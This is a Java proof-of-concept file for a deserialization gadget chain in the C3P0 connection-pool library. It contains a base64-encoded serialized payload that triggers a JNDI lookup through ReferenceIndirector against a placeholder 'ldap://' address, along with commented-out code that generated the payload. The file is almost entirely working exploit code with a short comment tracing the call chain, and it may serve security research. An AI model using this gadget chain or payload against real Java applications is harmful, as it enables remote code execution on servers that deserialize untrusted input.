package com.example.C3P0;

import com.example.Utils.Encoder;
import com.example.Utils.SerializeUtil;
import com.mchange.v2.naming.ReferenceIndirector;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class POC_1 {

    /***
     * <com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase: void readObject(java.io.ObjectInputStream)>
     * <com.mchange.v2.naming.ReferenceIndirector: java.lang.Object getObject()>
     * <javax.naming.InitialContext: java.lang.Object lookup(javax.naming.Name)>
     */

    public static void main(String[] args) throws Exception {
//        PoolBackedDataSource b = new PoolBackedDataSource(); 修改了源码从而生成payload
//        b.setConnectionPoolDataSource(new PoolSource());
//        System.out.println(Encoder.encodeBase64(SerializeUtil.serialize(b)));
        String payload = "rO0ABXNyAChjb20ubWNoYW5nZS52Mi5jM3AwLlBvb2xCYWNrZWREYXRhU291cmNl3iLNbMf/f6gCAAB4cgA1Y29tLm1jaGFuZ2UudjIuYzNwMC5pbXBsLkFic3RyYWN0UG9vbEJhY2tlZERhdGFTb3VyY2UAAAAAAAAAAQMAAHhyADFjb20ubWNoYW5nZS52Mi5jM3AwLmltcGwuUG9vbEJhY2tlZERhdGFTb3VyY2VCYXNlAAAAAAAAAAEDAAhJABBudW1IZWxwZXJUaHJlYWRzTAAYY29ubmVjdGlvblBvb2xEYXRhU291cmNldAAkTGphdmF4L3NxbC9Db25uZWN0aW9uUG9vbERhdGFTb3VyY2U7TAAOZGF0YVNvdXJjZU5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAApleHRlbnNpb25zdAAPTGphdmEvdXRpbC9NYXA7TAAUZmFjdG9yeUNsYXNzTG9jYXRpb25xAH4ABEwADWlkZW50aXR5VG9rZW5xAH4ABEwAA3Bjc3QAIkxqYXZhL2JlYW5zL1Byb3BlcnR5Q2hhbmdlU3VwcG9ydDtMAAN2Y3N0ACJMamF2YS9iZWFucy9WZXRvYWJsZUNoYW5nZVN1cHBvcnQ7eHB3AgABc3IAPWNvbS5tY2hhbmdlLnYyLm5hbWluZy5SZWZlcmVuY2VJbmRpcmVjdG9yJFJlZmVyZW5jZVNlcmlhbGl6ZWRiGYXQ0SrCEwIABEwAC2NvbnRleHROYW1ldAATTGphdmF4L25hbWluZy9OYW1lO0wAA2VudnQAFUxqYXZhL3V0aWwvSGFzaHRhYmxlO0wABG5hbWVxAH4ACkwACXJlZmVyZW5jZXQAGExqYXZheC9uYW1pbmcvUmVmZXJlbmNlO3hwc3IAGWphdmF4Lm5hbWluZy5Db21wb3VuZE5hbWUwwQpX7TeRxAMAAHhwc3IAFGphdmEudXRpbC5Qcm9wZXJ0aWVzORLQenA2PpgCAAFMAAhkZWZhdWx0c3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cgATamF2YS51dGlsLkhhc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAh3CAAAAAsAAAAAeHB3BAAAAAF0AApsZGFwOi8veHh4eHBwcHBzcgAlamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZU1hcPGlqP509QdCAgABTAABbXEAfgAFeHBzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHhwdAAdMWhnZWJ5OWIzOHllY3U4cnM5dzdnfDI4Yzk3YTV3BAAAAAN4dwIAAXg=";
        SerializeUtil.deserialize(Encoder.decodeBase64(payload));
    }

    private static class PoolSource extends ReferenceIndirector implements ConnectionPoolDataSource, Referenceable {

        public PoolSource () {
        }

        @Override
        public Reference getReference() throws NamingException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }

    }

}
